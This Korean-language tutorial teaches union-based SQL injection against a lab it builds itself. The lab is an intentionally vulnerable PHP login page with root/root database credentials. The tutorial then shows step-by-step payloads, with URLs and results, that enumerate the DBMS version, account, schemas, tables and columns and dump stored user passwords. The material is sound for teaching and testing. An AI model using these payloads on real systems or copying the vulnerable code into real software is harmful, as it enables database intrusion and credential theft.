# Union based SQL Injection

정보를 획득하기 위해 정상적인 쿼리에 추가적인 쿼리를 주입하여 정보를 획득한다.

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [UNION](#UNION)**

 - [DBMS 버전 확인](#DBMS-버전-확인)

 - [DBMS 계정 확인](#DBMS-계정-확인)

 - [데이터베이스 이름 확인](#데이터베이스-이름-확인)

 - [테이블 이름 확인](#테이블-이름-확인)

 - [컬럼 이름 확인](#컬럼-이름-확인)

 - [데이터 확인](#데이터-확인)


# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |
| mariadb       | 10.3.34-0ubuntu0.20.04.1  |

apache, php와 데이터베이스를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php mariadb-server php-mysql
```

root비밀번호를 설정하고 데이터베이스, 테이블을 생성한 뒤 데이터를 넣자.

```sh
root@ubuntu:~# mysql_secure_installation
Enter current password for root (enter for none):
Set root password? [Y/n] Y
New password:
Re-enter new password:
Remove anonymous users? [Y/n] Y
Disallow root login remotely? [Y/n] n
Remove test database and access to it? [Y/n] Y
Reload privilege tables now? [Y/n] Y
root@ubuntu:~# mysql -u root -p'root'
MariaDB [(none)]> create database test;
MariaDB [(none)]> use test;
MariaDB [test]> create table user (id varchar(30), pw varchar(30));
MariaDB [test]> insert into user(id,pw) values('admin','helloworld');
```

생성한 데이터베이스로 접근할 수 있는 권한을 부여하자.

```sh
MariaDB [(none)]> grant all privileges on test.* to 'root'@localhost identified by 'root';
MariaDB [(none)]> flush privileges;
```

이후 php.ini를 수정하여 데이터베이스 관련 함수를 사용할 수 있도록 하자.

```ini
extension=mysqli.so
```

SQLi(SQL Injection)에 취약한 페이지를 생성하자.

```php
<?php
	if (isset($_GET['userid']) && isset($_GET['password'])) {
		$conn = mysqli_connect("localhost", "root", "root", "test");
		if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
		$sql = "SELECT id, pw FROM user WHERE id='".$_GET['userid']."' and pw='".$_GET['password']."'";
		$result = mysqli_query($conn, $sql);
		if (!result) echo "mysql query error : ".mysqli_error($conn);
		else {
			$row = mysqli_fetch_array($result);
			if ($row) echo "Welcome ".$row[id];
			else echo "Login Failed : ".mysqli_error($conn);
			mysqli_close($conn);
		}
	} else {
?>
<html>
	<body>
		<form action="/index.php" method="get">
			<label>ID : </label><input type="text" name="userid" required>
			<label>PW : </label><input type="password" name="password" required>
			<input type="submit" value="login">
		</form>
	</body>
</html>
<?php
	}
?>
```

# **UNION**

UNION을 사용하기 위해서는 정상적인 쿼리의 컬럼 수를 알아야 한다. 컬럼 수가 1개인 것을 가정하고 시도했을 때, 컬럼의 수가 다르다는 에러 메세지를 확인할 수 있다.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT 1# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+1%23&password=123 |

결과는 다음과 같다.

	Login Failed : The used SELECT statements have a different number of columns

컬럼의 수가 맞다면 결과는 다르게 나온다.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT 1,2# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+1%2C2%23&password=123 |

결과는 다음과 같다.

	Welcome 1

## **DBMS 버전 확인**

UNION을 이용하여 DBMS의 버전을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION  SELECT VERSION(),NULL# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+VERSION%28+%29%2CNULL%23&password=123 |

결과는 다음과 같다.

	Welcome 10.3.34-MariaDB-0ubuntu0.20.04.1

## **DBMS 계정 확인**

UNION을 이용하여 DBMS 접속 계정을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION  SELECT USER(),NULL# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+USER%28+%29%2CNULL%23&password=123 |

결과는 다음과 같다.

	Welcome root@localhost

## **데이터베이스 이름 확인**

UNION을 이용하여 데이터베이스 이름을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION  SELECT DATABASE(),NULL# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+DATABASE%28+%29%2CNULL%23&password=123 |

결과는 다음과 같다.

	Welcome test

모든 데이터베이스 이름을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),NULL FROM information_schema.SCHEMATA# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+GROUP_CONCAT%28SCHEMA_NAME%29%2CNULL+FROM+information_schema.SCHEMATA%23&password=123 |

결과는 다음과 같다.

	Welcome information_schema,mysql,test,performance_schema

## **테이블 이름 확인**

UNION을 이용하여 데이터베이스의 테이블 이름을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT GROUP_CONCAT(TABLE_NAME),NULL FROM information_schema.TABLES WHERE TABLE_SCHEMA='test'# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+GROUP_CONCAT%28TABLE_NAME%29%2CNULL+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA%3D%27test%27%23&password=123 |

결과는 다음과 같다.

	Welcome user

## **컬럼 이름 확인**

UNION을 이용하여 테이블의 칼럼 이름을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT GROUP_CONCAT(COLUMN_NAME),NULL FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='test' AND TABLE_NAME='user'# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+GROUP_CONCAT%28COLUMN_NAME%29%2CNULL+FROM+information_schema.COLUMNS+WHERE+TABLE_SCHEMA%3D%27test%27+AND+TABLE_NAME%3D%27user%27%23&password=123 |

결과는 다음과 같다.

	Welcome id,pw

## **데이터 확인**

UNION을 이용하여 테이블의 데이터를 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT GROUP_CONCAT(id),NULL FROM user# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+GROUP_CONCAT%28id%29%2CNULL+FROM+user%23&password=123 |

결과는 다음과 같다.

	Welcome admin

두번째 컬럼의 데이터도 확인해 보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' UNION SELECT GROUP_CONCAT(pw),NULL FROM user# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+UNION+SELECT+GROUP_CONCAT%28pw%29%2CNULL+FROM+user%23&password=123 |

결과는 다음과 같다.

	Welcome helloworld